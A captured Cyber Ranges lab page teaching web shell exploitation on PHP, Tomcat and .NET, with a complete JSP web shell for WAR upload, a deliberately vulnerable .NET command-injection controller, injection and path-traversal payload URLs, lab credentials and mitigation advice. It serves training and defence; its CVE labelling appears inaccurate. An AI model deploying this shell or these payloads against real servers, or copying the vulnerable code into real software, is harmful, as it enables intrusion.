@@ -1,0 +1,611 @@
+Timestamp: 2025-12-28T11:46:04.608527
+URL: https://app.cyberranges.com/instance/6950fbb6dabdba0ee85a7501/overview
+Title: Scenario Overview | Exploiting Web Shells - CYBER RANGES
+Hash: 4a08015c779572d6d4d76c154b8e949aef05b814ea8011621d3c38b2bf324a16
+================================================================================
+Exploiting Web Shells
+88 MIN
+0
+VPN
+CLOUD
+Overview
+Questions
+Servers
+Score
+Help
+Exit
+MISSION
+RULES
+EXPLOITING WEB SHELLS: PHP, .NET AND TOMCAT
+INTRODUCTION
+
+A web shell is a script or program used by attackers to obtain remote access and control over a server for malicious purposes. It acts as a clandestine gateway, providing unauthorized individuals with a remote command-line interface to the server, and enabling them to execute commands, upload or download files, and perform various actions on the compromised system. This tutorial aims to explore the mechanisms behind web shells, how to exploit them, and mitigation strategies that administrators can implement to safeguard against exploiting web shells.
+
+LAB ACCESS GUIDELINES
+
+To support the completion of this scenario, you are provided with a Kali VM.
+
+Browser-based access is provided via the web service for GUI.
+
+VM
+
+	
+
+IP
+
+	
+
+Username
+
+	
+
+Password
+
+	
+
+Service
+
+
+
+
+Ubuntu-server-Apache/tomcat
+
+	
+
+192.168.125.103:8080
+
+	
+
+admin
+
+	
+
+admin_password
+
+	
+
+Tomcat/PHP
+
+
+
+
+Windows-Dotnet-Server
+
+	
+
+192.168.125.104:7008
+
+	
+
+rangeadmin
+
+	
+
+password_CR1
+
+	
+
+Dotnet(.net)
+
+
+
+
+Kali
+
+	
+
+192.168.125.99
+
+	
+
+rangeadmin
+
+	
+
+password_CR1
+
+	
+
+For VPN access steps see the Rules section.
+
+How Do Web Shells Work?
+
+Most programming languages used in web development enable the execution of system commands and external processes through functions like system() or exec(). While this is not by itself a vulnerability, attackers can manipulate the parameters passed to these functions, thereby identifying entry points through command injection or file upload vulnerabilities. This enables them to execute commands on the target host by passing arguments through the script. This is followed by establishing a persistent mechanism on the server for remote access and finally attempting to escalate privileges and leverage the backdoor to infiltrate organizations or exploit resources.
+
+Web Shells Vs Reverse Shells
+
+Web shells and reverse shells have precisely the same purpose: to allow remote shell access to a system. However, they use different methods to circumvent typical limitations such as firewalls:
+
+For reverse shells, the connection is established from the server to an attacker-controlled endpoint.
+
+Most firewalls do not block outgoing network traffic from the server, and such connections work directly even with Network Address Translation (NAT).
+
+For web shells, the connection is established to a web page.
+
+If the system serves web pages, it cannot block web access, so the attacker is always able to connect.
+
+Types of Web Shells
+
+There are two types of web shells.
+
+One requires the web browser as the client – in this case, the web browser displays an interface that lets the user send commands to the operating system and view the results.
+
+The other requires a client script and looks like a typical command-line console.
+
+It uses HTTP to send commands to the shell installed on the server, receives responses, and displays them in the console.
+
+Web shells may be written in any programming language that the web server supports and runs. Most are developed in PHP due to its popularity, but you can find them in ASP, Python, Perl, Ruby, and Unix. For this scenario, we choose to focus on PHP, ASP.NET and JSP by exploiting the Apache Tomcat server.
+
+
+1. PHP WEB SHELLS
+
+PHP web shells are a specific category of web shells written in PHP scripting language and majorly use the PHP inbuilt functions to execute commands.
+
+The following are some of the common functions used to execute shell commands in PHP.
+
+System()
+
+The System() function executes an external program and displays the output.
+
+The one-liner PHP code executes the ls -la command to list files and directories in the current directory in Linux systems.
+
+<?php
+
+//Returns the listing of the directory where the file runs (windows)
+ system("ls -la");
+?>
+
+
+System() function output:
+
+http://192.168.125.103/ls.php
+Exec()
+
+The exec() function accepts a command as a parameter but does not output the result by default. If a second optional parameter is specified, the result will be returned as an array. Otherwise, only the last line of the result will be shown if echoed.
+
+<?php
+ // Executes but returns nothing 
+echo exec("ls -la");
+?>
+
+Exec() function output:
+
+http://192.168.125.103/exec.php
+Shell_exec()
+
+The shell_exec() function is similar to exec(). However, it executes a command in the shell and returns the complete output of the command as a string.
+
+It's useful when you want to capture the output of a command and use it within your PHP script.
+
+It returns the output of the command, but it doesn't display it directly to the output buffer (browser or console) unless you explicitly print or echo the result.
+
+<?php
+// Executes the command "ls -la" in the shell and captures the output
+$output = shell_exec("ls -la");
+
+// Output the result to the browser
+echo $output;
+?>
+
+
+shell_exec function output:
+
+http://192.168.125.103/shell-exec.php
+Passthru()
+
+The passthru() function in PHP executes the command specified by the argument and directly passes the raw output to the output buffer. This means it will display the output directly to the user's browser without any PHP processing.
+
+http://192.168.125.103/passthru.php
+<?php
+ // Execute the command and display raw output 
+passthru("ls -la"); 
+?>
+
+Having an understanding of different PHP functions that would result in getting a shell, we are set to try it out on this simple implementation of a search application.
+
+ http://192.168.125.103/
+
+The 'CR' parameter specifies the item we want to search for, in the application. When you use Linux commands such as ls it prints out a list of the content in the directory.
+
+The PHP script acts as a shell, which allows the user to execute arbitrary commands on the web server where it's hosted using the CR parameter which is passed as part of the URL query.
+
+Occasionally, the output might not be visible or rendered on the HTML page by default, so it's important to prepend view-source: to the URL or Burp Suite Repeater.
+
+We can also utilize Burp Suite which is an integrated platform and graphical tool for performing security testing of web applications. The application is preinstalled in the Kali Linux VM.
+Go ahead and Intercept the request with Burp Suite.
+
+
+It's recommended to start Burp Suite from the terminal by running burpsuite. Navigate to the Proxy tab and then click on Open Browser.
+
+On the Chromium browser, use the URLs below:
+
+http://192.168.125.103/?CR=ls
+
+http://192.168.125.103/?CR=whoami
+
+Click on the HTTP History tab to view the requests after opening the URLs from the browser then send whoami request to the Repeater tab and click Send.
+
+Other Useful Commands
+
+Purpose of command
+
+	
+
+Linux
+
+	
+
+Windows
+
+
+
+
+Name of the current user
+
+	
+
+whoami
+
+	
+
+whoami
+
+
+
+
+Operating system
+
+	
+
+uname -a
+
+	
+
+ver
+
+
+
+
+Network configuration
+
+	
+
+ifconfig
+
+	
+
+ipconfig /all
+
+
+
+
+Network connections
+
+	
+
+netstat -an
+
+	
+
+netstat -an
+
+
+
+
+Running processes
+
+	
+
+ps -ef
+
+	
+
+tasklist
+
+
+
+
+Opening files
+
+	
+
+cat
+
+	
+
+2. EXPLOITING APACHE TOMCAT TO OBTAIN A SHELL - CVE-2007-1860
+
+Apache Tomcat is a Java-based HTTP Web Server, supporting Java EE Specifications such as Java Servlet, JavaServer Pages (JSP), Java EL, and WebSockets. Running within a single operating system process in the Java virtual machine (JVM) during its simplest configuration, Apache Tomcat achieves platform independence and enhanced security compared to alternative solutions. Notably, vulnerabilities and CVEs exist within both Apache and Tomcat.
+
+We will use the following server IP:
+
+http://192.168.125.103:8080/
+Service Enumeration
+
+Pentesting Apache Tomcat servers involves several steps:
+
+Service enumeration to identify versions
+
+Directory enumeration/discovery to locate common directories and paths
+
+Brute-forcing login credentials or user enumeration.
+
+The next step is exploiting file upload vulnerabilities. This will enable us to gain either remote code execution or a reverse shell. Finally, we can leverage available CVEs and exploits in Metasploit to further investigate vulnerabilities and escalations from within the system.
+
+Access the Kali attacker machine provided to scan and create the exploit.
+
+nmap -sV 192.168.125.103
+
+For this scenario, we assume the attacker already has access to the manager's portal, either through brute-forcing credentials or exploiting other vulnerabilities in Tomcat.
+Use the provided username and password or Exploit other vulnerabilities to get the same login credentials.
+
+This is what the default Apache Tomcat page looks like:
+
+Accessing the Application
+
+We got to the interface by entering the server’s IP address followed by port 8080 in our browser. Now we will try to see if the Manager and Host Manager interfaces are available
+
+http://192.168.125.103:8080/manager/html
+
+
+Click the button Manager App as illustrated in the image and a login authentication page will pop up as expected. Enter the provided credentials( admin : admin_password).
+
+
+Most of the time, it's protected by a password and should not be installed on production servers. It's important to ensure we use strong passwords and disable public access to prevent such attacks.
+
+Upon verification of the credentials, Apache Tomcat lands us on the Tomcat Virtual Host Manager Interface. From this page, you can add virtual hosts to serve your applications.
+
+Scroll down to find the “WAR file to deploy” section, where we will upload our shell.
+
+CVE-2007-1860 Exploit Overview
+
+Our exploit will specifically involve crafting a simple JSP file and compressing it into a WAR file (Web Archive Resource or Web Application Resource). WAR is an extension of a file that packages a web application directory hierarchy in ZIP format.
+
+Java web applications are typically packaged as WAR files for deployment. These files can be created using the command line or your favorite Java IDE. There are various ways to deploy the exploit: using Metasploit or manually creating the exploit.
+
+For this scenario, we focus on creating the exploit manually.
+
+HTML snippet.
+
+
+
+<FORM METHOD=GET ACTION='index.jsp'>
+    <INPUT name='cmd' type=text>
+    <INPUT type=submit value='Run'>
+</FORM>
+
+
+The HTML part defines a form with a text input field and a submit button. When the user enters a command into the text field and submits the form, it sends a GET request to index.jsp with the command as a parameter named "cmd".
+
+JSP snippet.
+
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%>
+
+This imports Java packages and retrieves the command parameter from the request. It then checks if the cmd parameter is empty/null. If it's not null, it attempts to execute the command using Runtime.getRuntime().exec(cmd, null, null). This line invokes the command on the underlying operating system. It creates a BufferedReader to read the output of the executed command and appends each line of the output to the output variable. Finally, it displays the output within a <pre> tag to preserve formatting.
+
+Deploying the Exploit.
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%>
+<pre><%=output %></pre>
+
+Create a directory and index.jsp then paste the above code into the file.
+
+Build the war file to create a JAR file shell.war containing the above index.jsp file with a verbose option to show the progress of the operation.
+
+mkdir Tomcat-shell && cd Tomcat-shell
+
+nano index.jsp
+
+jar -cvf shell.war *
+
+Upload the generated shell.war file in the WAR file to the deploy section.
+
+Once uploaded the file can be identified in the applications section.
+
+Click on the simple application we uploaded and this will present you with the HTML form with an option to run your commands.
+
+http://192.168.125.103:8080/shell/index.jsp?cmd=whoami
+
+We have successfully uploaded a shell and gotten access to the underlying operating system. With the persistent shell, we can carry out other attacks and run different commands.
+
+3. EXPLOITING .NET APPLICATIONS TO OBTAIN A SHELL
+
+From the previous attempts, web shell and injection attacks cut across all programming languages. In the .NET ecosystem, which encompasses a rich set of frameworks, libraries, and tools for building various types of applications, the threat of webshells is particularly pertinent. .NET applications, including web applications built with ASP.NET, are susceptible to webshell attacks if proper security measures to handle user inputs are not in place.
+
+In this scenario, we delve into the creation and exploration of a .NET web shell. We'll explore how attackers may leverage vulnerabilities in .NET MVC web applications to implant and execute web shells, as well as the potential impact of such compromises on the security and integrity of the target system.
+
+Lab Setup
+
+This setup is a .NET reporting application vulnerable to command injection. You are provided with a Windows VM with the .NET application source code in Visual Studio Code. You can use the provided source code to launch the application and follow through with the scenario.
+
+
+Workflow in .NET MVC
+
+The .NET MVC (Model-View-Controller) application architecture is a structured approach for developing web applications in the .NET ecosystem. It divides the application into three interconnected components:
+
+The Model - is responsible for managing data and business logic
+
+The View - handles the presentation layer and renders the user interface
+
+The Controller - serves as the intermediary to process user requests, execute actions, and coordinate interactions between the Model and the View.
+
+The workflow of .NET MVC involves routing requests, processing them through controllers, rendering views, and sending responses back to clients. With that in mind, it is important to structure how you enumerate the MVC applications.
+
+Go ahead and open the Visual Studio Code shortcut on the Desktop to access the provided application source code.
+
+Routing:
+
+Incoming requests are matched to route patterns defined in the application's route configuration.
+
+Routes direct requests to the appropriate controller action based on the URL and HTTP method.
+
+Controller Processing:
+
+The controller receives the request, processes input data and performs necessary business logic.
+
+It interacts with the model layer to retrieve or manipulate data.
+
+View Rendering:
+
+The controller selects an appropriate view template and passes data to it.
+
+The view renders the UI using the provided data and generates HTML markup.
+
+Response Sent to Client:
+
+The generated HTML response is sent back to the client's browser for display.
+
+Command Injection in .NET Applications
+
+In .NET applications, code injection vulnerabilities often arise from improper handling of user input, especially in scenarios involving dynamic construction of commands or queries.
+
+Let's examine a vulnerability in a .NET application.
+
+Sample Application Overview
+
+The application has 2 main functions in the controller:
+
+The generate function which generates the reports and
+
+The Download function which downloads the reports.
+
+Here's a snippet of the vulnerable code:
+
+        public IActionResult Generate(string? id)
+
+        {           
+
+            // Specify the new location where the file will be stored
+
+            string newLocation = "C:/Users/rangeadmin/injection-demo/Reports";
+
+            // Combine the new location with the id to create the file path
+
+            var filePath = System.IO.Path.Combine(newLocation, id);
+
+            // Prepare the process start information
+
+           
+
+            var startInfo = new System.Diagnostics.ProcessStartInfo();
+
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+
+            startInfo.FileName = "cmd.exe";
+
+            startInfo.Arguments = $"/C echo CyberRanges 2024 > {filePath}";
+
+            using (var process = new System.Diagnostics.Process { StartInfo = startInfo })
+
+            {
+
+                process.Start();
+
+                process.WaitForExit();
+
+            }
+
+            return RedirectToAction("Download");
+
+        }
+
+
+The Generate method within the .NET MVC controller is designed to create a file/report in a predetermined directory C:/Users/rangeadmin/injection-demo/Reports.
+
+It constructs the file path by combining the directory with the provided id or name of file. Utilizing system commands, it executes cmd.exe with arguments to echo the text "CyberRanges 2024" into the file determined by filePath. Following the successful file creation, it redirects users to the Download action to download the generated report.
+
+Running the Sample Application
+
+Launch the application from the VScode console using the steps provided below.
+Run dotnet run to launch and build the application.
+
+After enumeration below link, you will identify a hidden endpoint that is used to generate reports given a report name.
+
+https://192.168.125.104:7008
+
+Takes in a string and generates a report.
+
+https://192.168.125.104:7008/Report/generate/cyberranges
+
+Download the generated report.
+
+https://192.168.125.104:7008/Report/Download
+Exploiting the Vulnerability
+
+This sample app is quite naive in the way it handles user input. It simply accepts any input and concatenates it into a command to be executed by the underlying OS. An attacker could craft a malicious URL to exploit the vulnerability.
+
+We will use the payload below to demonstrate this:
+
+https://192.168.125.104:7008/Report/generate/777&&whoami>whoami.txt
+
+The shell operator && serves as a logical AND and ensures the subsequent command is executed only if the preceding commands are executed. That is the command that creates a file/report with the name 777 and then executes the second part of the request.
+whoami > whoami.txt retrieves the username of the currently logged-in user and stores it in a text file named whoami.txt. This command consists of two components: whoami, a system command that prints the current user's username, and the > operator, which redirects the output of the whoami command to a file.
+
+Open the Reports folder to view the generated reports and the subsequent file whoami.txt
+
+From the source code and understanding of the MVC frameworks, we noted that appending && whoami > whoami.txtcreated the output file in the MVC content rootpath.
+
+With this in mind, we can combine this to exploit path traversal vulnerability to download the file.
+
+Copy the download file link by right-clicking >> Copy Link address.
+
+With the idea on the MVC content path, environment, and root path, we can make use of path traversal to download our file
+
+Note: You can enumerate further as well
+
+https://192.168.125.104:7008/Report/DownloadFile?fileName=777
+
+Our edited URL using the dot dot path traversal method for downloading the whoami.txt to our local machine .
+
+https://192.168.125.104:7008/Report/DownloadFile?fileName=../whoami.txt
+
+Opening the download file with Notepad, we can get the output of the whoami command in our local machine.
+
+Tip: Try another shell command using the above steps.
+
+Summary
+
+Code injection vulnerabilities pose significant risks to the security and integrity of .NET applications. By understanding common attack vectors, implementing secure coding practices, and conducting thorough security assessments, organizations can mitigate the risks associated with code injection and build more resilient and secure .NET applications. Generally speaking, you should never blindly trust any information that comes from the outside of your app. That includes data from web forms, URL parameters, and data from POST/PUT/PATCH requests to API endpoints as this is what attackers would be eyeing.
+
+How to Prevent Web Shells and Code Injections
+
+If you’re using PHP, disable potentially dangerous PHP functions such as exec(), shell_exec(), passthru(), system(), show_source(), proc_open(), pcntl_exec(), eval(), and assert(). To do that, add a disable_functions directive in your php.ini. Of course, this is only practical if you don’t use these functions in your web applications.
+
+Sanitize all user inputs.
+
+If any of your web applications allow file uploads to the web server, make sure that you only permit uploading for whitelisted file types. Take care to verify uploads not only based on file extensions but also by checking file content on the server side for potential malicious payloads.
+
+Configure a web application firewall (WAF) to your internet-facing server, to block attempts to upload malicious files.
+
+CONCLUSION
+
+We have successfully looked at different ways to exploit and develop web shells in PHP, .NET and Tomcat applications.
+Go ahead and answer the questions provided.
